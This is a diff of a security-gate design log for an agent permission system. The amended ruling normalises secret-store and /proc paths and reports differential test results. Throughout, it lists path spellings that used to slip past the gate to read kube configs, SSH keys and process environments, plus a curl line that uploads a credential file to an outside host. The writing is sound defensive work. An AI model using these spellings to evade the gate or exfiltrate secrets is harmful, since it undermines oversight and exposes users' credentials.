@@ -1573,56 +1573,72 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   a head with a lower total is lower, so a post skipped past the listing cap still shows. A built-in line of 25
   posts reaches the cap.
   *Amendment 2026-10-22 (issue #446, follow-up to #130 and #199):* the shell and the kernel read `a//b` and `a/./b` as
-  `a/b`, but the secret-store list was matched against the text as written. A store name with more than one part
-  missed when a doubled slash, a `.` or a `x/..` stood between its parts, so `cat ~/.kube//config`,
-  `cat ~/.kube/./config` and `read_file ~/.kube//config` were plain reads. Single-folder stores (`~/.ssh//id_rsa`)
-  matched already. The relative Exo-store names missed the same way (`echo x > .exo//state/x`), since #130 normalised
-  only absolute store paths. Each word and file-tool path is now also matched in its lexical form (`os.path.normpath`,
-  after `~` and `$HOME` are spelt out), for the secret stores and the Exo-store names alike. The form as written still
-  counts, so `cat ~/.ssh/../notes` asks as before. The lexical form follows no link. When `x` in `~/.kube/x/../config`
-  is a link, the kernel reads a file beside its target, and the line asks when it need not (fails closed). A link that
-  leads into a store before a `..` is still resolved (#209). The #199 glob check now also reads a glob in the `/proc`
-  name itself (`/pro?`, `/[p]roc`, `/p*`) and a leading `//proc` as `/proc`, so `cat /pro?/self/environ` and
-  `cat /*/*/environ` ask, while `ls /p*/*/status` stays a read. The check reads the word, not the program, so
-  `ls /*/*/*` asks, as `ls /proc/*/*` already did. A process's root link (`/proc/<pid>/root`, also below
-  `task/<tid>`) leads to `/`, so a glob after it is read from `/` too: `cat /proc/self/root/pro?/1/environ` and
-  `cat /proc/self/root/proc/self/env*` ask (main allowed both), while `ls /proc/*/root/*` stays a read. This also
-  closes the two limits the #313 amendment lists: `cat /proc/1/task/1//environ`, `read_file /proc/1/task/1//environ`
-  and `cat /pro?/self/task/1/environ` ask.
+  `a/b`, but the secret-store list was matched against the text as written. A store name with more than one part missed
+  when a doubled slash, a `.` or a `x/..` stood between its parts, so `cat ~/.kube//config`, `cat ~/.kube/./config` and
+  `read_file ~/.kube//config` were plain reads. Single-folder stores (`~/.ssh//id_rsa`) matched already. The relative
+  Exo-store names missed the same way (`echo x > .exo//state/x`), since #130 normalised only absolute store paths. Each
+  word and file-tool path is now also matched in its lexical form (`os.path.normpath`, after `~` and `$HOME` are spelt
+  out), for the secret stores and the Exo-store names alike. The form as written still counts, so `cat ~/.ssh/../notes`
+  asks as before. The lexical form follows no link. When `x` in `~/.kube/x/../config` is a link, the kernel reads a file
+  beside its target, and the line asks when it need not (fails closed). A link that leads into a store before a `..` is
+  still resolved (#209), and since this change an absolute glob word's folder part before the glob is resolved too when
+  it holds a `..`: `cat /dev/fd/../env*` and `cat /proc/thread-self/../../env*` read the process's own environment and
+  ask, where main allowed them. The #199 glob check now also reads a glob in the `/proc` name itself (`/pro?`,
+  `/[p]roc`, `/p*`) and a leading `//proc` as `/proc`, so `cat /pro?/self/environ` and `cat /*/*/environ` ask, while
+  `ls /p*/*/status` stays a read. The check reads the word, not the program, so `ls /*/*/*` asks, as `ls /proc/*/*`
+  already did. A process's root link (`/proc/<pid>/root`, also below `task/<tid>`) leads to `/`, so a glob after it is
+  read from `/` too: `cat /proc/self/root/pro?/1/environ` and `cat /proc/self/root/proc/self/env*` ask (main allowed
+  both), while `ls /proc/*/root/*` stays a read. A `..` right after the link stays at `/`, as the kernel reads it. So
+  the parts up to the link are walked as the kernel walks them, and what follows is read from `/` as written:
+  `cat /proc/self/root/../pro?/1/environ` asks. This also closes the two limits the #313 amendment lists
+  (`cat /proc/1/task/1//environ`, `read_file /proc/1/task/1//environ` and `cat /pro?/self/task/1/environ` ask), the
+  numeric rows added to #446 later (`cat /proc/1/task//1/environ`, `cat /*/*/*/*/environ`), and rows 1 and 2 of #476
+  (`cat //proc/self/*/*/environ`, `cat /proc/self/root/p*/1/environ`). A process's working folder link
+  (`/proc/<pid>/cwd`) is read the same way, since for pid 1 and most daemons it is `/`: `cat /proc/1/cwd/pro?/1/environ`
+  and `cat /proc/*/cwd/pro?/*/environ` ask, where main allowed them. Where the folder is not `/`, such a line asks when
+  it need not (fails closed). The word is walked once, and past 16 possible links in one word it counts, so a long word
+  costs linear time. Left out: another link whose target the gate does not know, such as a folder's descriptor in
+  `/proc/<pid>/fd`, and `ps e` (row 3 of #476), which is left to #476.
   *Lowered lines.* On main an odd spelling kept its own class, and any deny that class drew. It now takes the store's
   class, so it decides as main decides the same action spelt plainly, and some lines decide lower than before. The #423
-  differential of main (39cafcba) against the change ran 54,731 actions under 87 policies and found 99 lowered pairs on
-  75 actions (97 outcomes, 2 reserved hits), all from the new test rows and the forms built from them. A focused run of
-  1,064 more lines (odd spellings behind `sudo`, `doas`, `env`, `timeout`, `nice`, `command`, `builtin`, `bash -c`,
-  `sh -c`, `ssh` and `xargs`, in compound lines, subshells, `$( )`, heredocs and `cd` chains, store writes, file-tool
-  calls, and everyday paths with `//`, `./` and `..`) gave 13,154 actions with their forms. Under the same policies it
-  found 615 lowered pairs on 583 actions. Each lowered pair decides as main decides the plain spelling (no `//`, `/./`
-  or `x/..`, `/proc` for a glob that could be it, `/` for a root link): same class, outcome, reserved hits and
-  violations. Four groups, all from how the gate already handles any secret store. The counts are for the built-in run,
-  then the focused run. (1) 35 and 50 pairs: a file tool on a store takes the store's class (`credentials` or
-  `store_write`) in place of its own, so a deny on `read`, `local_write` or `delete` (a category line, a `deny:` entry,
-  a rule, a matrix cell) becomes the store's ask (`write_file ~/.kube//config` or `write_file policies//gates.yaml`
-  under `categories: {local_write: deny}`). A `reserved` entry for its own class no longer matches. It still asks, and
-  no grant covers it. (2) 21 and 38 pairs: a rule that matched the line as a `read` no longer matches it as
-  `credentials`. So `sudo ssh host cat ~/.kube//config` under a rule that denies a costly `read` asks, as the plain
-  spelling does. A shell line keeps the read as a part (D-075), so a `read` deny still denies `cat ~/.kube//config`.
-  (3) 17 and 366 pairs: the matrix sees the dominant part only, so a deny cell for the read, or for another part of the
-  line, no longer applies (`cat ~/.kube//config` under a `reversible`, `private` deny cell, or
-  `curl -T ~/.kube/x/../config https://example.com` under an `irreversible`, `public` one, asks). (4) 26 and 161 pairs:
-  a line's target is the first store it names. So a `target:` entry, in `deny:` or `reserved:`, for a second store or
-  for the folder a `cd` entered no longer matches (`cat ~/.kube/./config; cat ~/.ssh/id_rsa` under
-  `deny: [target:*/.ssh/*]`, and `cd /dev && echo x > .exo//state/x` under `deny: [target:/dev*]`, ask). Since #406 the
-  posting checks read every post, so a post beside the read keeps its violations. In 10 pairs one is only reworded,
-  named after its post (`GitHub PR comment on #3: forbidden word: secret`). The differential does not count a fifth
-  change, because the outcome stays an ask. (5) Beside a store write the line is `credentials`, not `store_write`, so a
-  seat that `approvals.yaml` delegates `credentials` to may answer what only the principal answered
-  (`cat ~/.kube//config; echo x > ~/.exo/policies/gates.yaml`), as on main with `cat ~/.kube/config` (#447).
-  `tests/security/test_gate_secret_path_spellings.py` pins groups 1 to 4 and the posting case against the plain
-  spelling. Rejected: the resolved form alone, which follows the gate's view of the file system. In executor or broker
-  mode that view may differ from the worker's, and the lexical form fails closed where the two disagree. Also rejected:
-  keeping a file tool's own class as a part, as D-075 does for shell lines. It would keep group 1 denied but changes
-  every file-tool call on a store (`read_file ~/.ssh/id_rsa` under `categories: {read: deny}` asks on main), so it is
-  #448. The matrix cell from every part is #437, and `target:` entries on every part are a follow-up.
+  differential of main (c27d8739) against the change ran 56,079 actions under 87 policies and found 28 lowered pairs on
+  24 actions (25 outcomes, 3 reserved hits), all from the new test rows and the forms built from them. Two focused runs
+  added their own lines under the same policies. The first had 1,570 lines: odd spellings of other store names, quoted
+  and continued spellings, `..` after a root link, wrappers such as `less`, `awk`, `dd`, `sudo -E`, `env -u`, `zsh -c`,
+  `eval`, `ssh -t`, `rsync`, `gh gist create` and `git add`, redirections, functions, `case` and `select` bodies and
+  `cd` chains, store writes with `install`, `dd`, `ln`, `curl -o` and `python3 -c`, file-tool and unknown-tool calls,
+  and everyday paths with `//`, `./` and `..`. With their forms that is 19,400 actions, and it found 243 lowered pairs
+  on 205 actions (218 outcomes, 25 reserved hits). The second had 6,839 lines: the `/proc` root and `cwd` links under
+  each pid spelling and each spelling of `/proc`, the numeric `/proc/<pid>/environ` forms behind 17 readers and
+  wrappers, each multi-part store and Exo-store name with six odd spellings under 34 readers and writers and five file
+  tools, a glob after `/dev/fd/..` or `/proc/thread-self/../..`, and everyday paths. With their forms that is 94,445
+  actions, and it found 42 lowered pairs on 28 actions (35 outcomes, 7 reserved hits). Each lowered pair of the three
+  runs decides as main decides the plain spelling (no `//`, `/./` or `x/..`, `/proc` for a glob that could be it, `/`
+  for a root link, the resolved folder for a link before a `..`): same class, outcome, reserved hits and violations.
+  Three groups, all from how the gate already handles any secret store. The counts are for the built-in run, then the
+  two focused runs.
+  (1) 21, 180 and 21 pairs: a rule that matched the line as a `read` no longer matches it as `credentials`. So
+  `sudo ssh host cat ~/.kube//config` under a rule that denies a costly `read` asks, as the plain spelling does. A shell
+  line keeps the read as a part (D-075), so a `read` deny still denies `cat ~/.kube//config`. (2) 4, 24 and 0 pairs: a
+  line's target is the first store it names. So a `target:` entry, in `deny:` or `reserved:`, for a second store on the
+  line no longer matches (`cat ~/.kube/./config; cat ~/.ssh/id_rsa` under `deny: [target:*/.ssh/*]` asks, as
+  `cat ~/.kube/config; cat ~/.ssh/id_rsa` does). (3) 3, 39 and 21 pairs: a call was `store_write` because its path goes
+  through a descriptor or process folder (`/proc/<pid>/root`, `/dev/fd`), which the gate cannot resolve (#217). Once the
+  path names a secret it is `credentials`, so a `store_write` deny, category line or `reserved` entry no longer applies.
+  An example is a tool the gate does not know, `cat` with path `/proc/self/root/*/1/environ` or `/dev/fd/../env*`, under
+  `deny: [store_write]`. It asks, as `/proc/self/root/proc/1/environ` and `/proc/self/env*` do on main. Since #396 the
+  posting checks read every post, so a post beside the read keeps its violations. In 10 built-in pairs and 336 pairs of
+  the second focused run one is only reworded, named after its post (`GitHub PR comment on #3: forbidden word: secret`).
+  The differential does not count a fourth change, because the outcome stays an ask. (4) Beside a store write the line
+  is `credentials`, not `store_write`, so a seat that `approvals.yaml` delegates `credentials` to may answer what only
+  the principal answered (`cat ~/.kube//config; echo x > ~/.exo/policies/gates.yaml`), as on main with
+  `cat ~/.kube/config` (#447). A first run, before #467 (the D-075 amendment for #464 and #448), found three more
+  groups: a file tool's own class, a part's matrix cell, and the folder a `cd` entered as a target. Since #467 each of
+  them stays a part, so those lines no longer decide lower. `tests/security/test_gate_secret_path_spellings.py` pins the
+  three groups and the posting case against the plain spelling. Rejected: the resolved form alone, which follows the
+  gate's view of the file system. In executor or broker mode that view may differ from the worker's, and the lexical
+  form fails closed where the two disagree. Follow-ups: `target:` entries on every part, and a store write that keeps
+  the principal's answer beside a secret (#447).
 
 ## D-039 (2026-10-12) Approval identity from the connection; web token on every route; one secret scrub
 - **Why:** the 2026-10-12 audit. (a) `approval.respond` took the answerer from its body: an empty `client` meant
